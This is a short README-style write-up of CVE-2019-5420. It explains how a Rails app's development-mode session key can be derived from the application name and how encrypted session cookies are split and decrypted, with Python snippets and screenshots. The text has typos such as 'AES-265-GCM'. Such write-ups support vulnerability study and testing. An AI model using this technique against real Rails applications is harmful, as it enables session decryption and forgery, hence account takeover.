# CVE-2019-5420
A vulnerability can allow an attacker to guess the automatically generated development mode secret token.

Ruby-on-Rails when it is running in development mode. In development mode, it is possible for an attacker to guess the key used to secure the sessions.

# Decryption:

## Key Generate:
Rails uses 3 environments (development,test,production), when an application uses development mode you are able to guess secret token and decrypt the encrypted session.

The key used to protect session is derived from the application's name.

Example:
```bash
rails new Jakom
```
Jakom: Application Name.

By this we can guess the key is output of the generation method:
```
PKDF2_HMAC_SHA1[ MD5 [ APPNAME + "::Application" ] , salt: "authenticated encrypted cookie" , iterations: 1000 , key's length: 32 ]
```
As we can see here:
```python
key = pbkdf2_hmac("sha1", md5_name.encode("utf-8"), "authenticated encrypted cookie".encode("utf-8"), 1000, 32)
```
## Decrypt the session with the key:

In Rails, sessions are encrypted with AES-265-GCM, if you have the key you can decrypt/encrypt sessions.

Last thing you will need is the format of the session:
```
BASE64 [ DATA ] -- BASE64 [ IV ] -- BASE64 [ AUTH_TAG ]
```

## Decrypt example:
As we can see here:
```python
data = binascii.hexlify(base64.b64decode(base64_data.split("--")[0])).decode("utf-8")
iv = binascii.hexlify(base64.b64decode(base64_data.split("--")[1])).decode("utf-8")
tag = binascii.hexlify(base64.b64decode(base64_data.split("--")[2])).decode("utf-8")
```
The first part of the session cookie is the encrypted data, the second part is the IV, the third part is the GCM tag (Authentication Tag).
With those informations we can decrypt our sessions directly:
![image](https://user-images.githubusercontent.com/48088579/132349913-ed4e4e16-a50c-4652-9eee-d561d8372d0c.png)

### Example:

![image](https://user-images.githubusercontent.com/48088579/132350436-c798596f-3c15-4e47-8d2f-d1bd63a4045d.png)
